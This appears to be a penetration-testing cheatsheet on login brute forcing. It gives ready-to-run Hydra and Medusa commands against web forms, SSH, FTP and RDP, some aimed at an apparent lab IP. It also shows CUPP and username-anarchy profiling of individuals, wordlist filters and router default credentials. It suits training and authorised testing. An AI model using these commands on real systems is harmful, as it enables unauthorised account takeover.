# Login Brute Forcing

## Hydra

Brute force from basic login
```
hydra -l basic-auth-user -P /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt 94.237.55.9 http-get / -s 31625
```

Brute force username and password pair in post form
```
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt -f 94.237.55.9 -s 37368 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid
credentials"
```

## Medusa

```shell-session
medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3

medusa -h IP -n PORT -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3

medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
```

## Username-Anarchy

```shell-session
git clone https://github.com/urbanadventurer/username-anarchy.git
./username-anarchy Jane Smith > jane_smith_usernames.txt
```

## CUPP

```shell-session
sudo apt install cupp -y
cupp -i
```

Filter using grep
```
grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```

# Cheatsheets

## Default Credentials

- Default Usernames: Pre-set usernames that are widely known
- Default Passwords: Pre-set, easily guessable passwords that come with devices and software

|Device|Username|Password|
|---|---|---|
|Linksys Router|admin|admin|
|Netgear Router|admin|password|
|TP-Link Router|admin|admin|
|Cisco Router|cisco|cisco|
|Ubiquiti UniFi AP|ubnt|ubnt|

## Hydra
```bash
hydra [-l LOGIN|-L FILE] [-p PASS|-P FILE] [-C FILE] -m MODULE [service://server[:PORT][/OPT]]
```

| Hydra Service | Service/Protocol             | Description                                                                                             | Example Command                                                                                                          |
| ------------- | ---------------------------- | ------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------ |
| ftp           | File Transfer Protocol (FTP) | Used to brute-force login credentials for FTP services, commonly used to transfer files over a network. | `hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100`                                                       |
| ssh           | Secure Shell (SSH)           | Targets SSH services to brute-force credentials, commonly used for secure remote login to systems.      | `hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100`                                                        |
| http-get/post | HTTP Web Services            | Used to brute-force login credentials for HTTP web login forms using either GET or POST requests.       | `hydra -l admin -P /path/to/password_list.txt 127.0.0.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"` |

## Medusa
```bash
medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]
```

| Medusa Module | Service/Protocol              | Description                                                                     | Example Command                                                          |
| ------------- | ----------------------------- | ------------------------------------------------------------------------------- | ------------------------------------------------------------------------ |
| ssh           | Secure Shell (SSH)            | Brute force SSH login for the `admin` user.                                     | `medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh`               |
| ftp           | File Transfer Protocol (FTP)  | Brute force FTP with multiple usernames and passwords using 5 parallel threads. | `medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ftp -t 5`      |
| rdp           | Remote Desktop Protocol (RDP) | Brute force RDP login.                                                          | `medusa -h 192.168.1.100 -u admin -P passwords.txt -M rdp`               |
| http-get      | HTTP Web Services             | Brute force HTTP Basic Authentication.                                          | `medusa -h www.example.com -U users.txt -P passwords.txt -M http -m GET` |
| ssh           | Secure Shell (SSH)            | Stop after the first valid SSH login is found.                                  | `medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -f`            |
|               |                               |                                                                                 |                                                                          |

## Username-Anarchy
|Command|Description|
|---|---|
|`username-anarchy Jane Smith`|Generate possible usernames for "Jane Smith"|
|`username-anarchy -i names.txt`|Use a file (`names.txt`) with names for input. Can handle space, CSV, or TAB delimited names.|
|`username-anarchy -a --country us`|Automatically generate usernames using common names from the US dataset.|
|`username-anarchy -l`|List available username format plugins.|
|`username-anarchy -f format1,format2`|Use specific format plugins for username generation (comma-separated).|
|`username-anarchy -@ example.com`|Append `@example.com` as a suffix to each username.|
|`username-anarchy --case-insensitive`|Generate usernames in case-insensitive (lowercase) format.|

CUPP (Common User Passwords Profiler) creates personalized password wordlists based on gathered intelligence.

| Command                | Description                                                         |
| ---------------------- | ------------------------------------------------------------------- |
| `cupp -i`              | Generate wordlist based on personal information (interactive mode). |
| `cupp -w profiles.txt` | Generate a wordlist from a predefined profile file.                 |
| `cupp -l`              | Download popular password lists like `rockyou.txt`.                 |

## Filter Wordlist Matching Password Policy
| Policy Requirement                         | Grep Regex Pattern                                       | Explanation                                                                                                                                                                                                                                                                                                                                                                                                               |
| ------------------------------------------ | -------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Minimum Length (e.g., 8 characters)        | `grep -E '^.{8,}$' wordlist.txt`                         | `^` matches the start of the line, `.` matches any character, `{8,}` matches 8 or more occurrences, `$` matches the end of the line.                                                                                                                                                                                                                                                                                      |
| At Least One Uppercase Letter              | `grep -E '[A-Z]' wordlist.txt`                           | `[A-Z]` matches any uppercase letter.                                                                                                                                                                                                                                                                                                                                                                                     |
| At Least One Lowercase Letter              | `grep -E '[a-z]' wordlist.txt`                           | `[a-z]` matches any lowercase letter.                                                                                                                                                                                                                                                                                                                                                                                     |
| At Least One Digit                         | `grep -E '[0-9]' wordlist.txt`                           | `[0-9]` matches any digit.                                                                                                                                                                                                                                                                                                                                                                                                |
| At Least One Special Character             | `grep -E '[!@#$%^&*()_+-=[]{};':"\,.<>/?]' wordlist.txt` | `[!@#$%^&*()_+-=[]{};':"\,.<>/?]` matches any special character (symbol).                                                                                                                                                                                                                                                                                                                                                 |
| No Consecutive Repeated Characters         | `grep -E '(.)\1' wordlist.txt`                           | `(.)` captures any character, `\1` matches the previously captured character. This pattern will match any line with consecutive repeated characters. Use `grep -v` to invert the match.                                                                                                                                                                                                                                   |
| Exclude Common Patterns (e.g., "password") | `grep -v -i 'password' wordlist.txt`                     | `-v` inverts the match, `-i` makes the search case-insensitive. This pattern will exclude any line containing "password" (or "Password", "PASSWORD", etc.).                                                                                                                                                                                                                                                               |
| Exclude Dictionary Words                   | `grep -v -f dictionary.txt wordlist.txt`                 | `-f` reads patterns from a file. `dictionary.txt` should contain a list of common dictionary words, one per line.                                                                                                                                                                                                                                                                                                         |
| Combination of Requirements                | `grep -E '^.{8,}$' wordlist.txt \| grep -E '[A-Z]'`      | This command filters a wordlist to meet multiple password policy requirements. It first ensures that each word has a minimum length of 8 characters (`grep -E '^.{8,}$'`), and then it pipes the result into a second `grep` command to match only words that contain at least one uppercase letter (`grep -E '[A-Z]'`). This approach ensures the filtered passwords meet both the length and uppercase letter criteria. |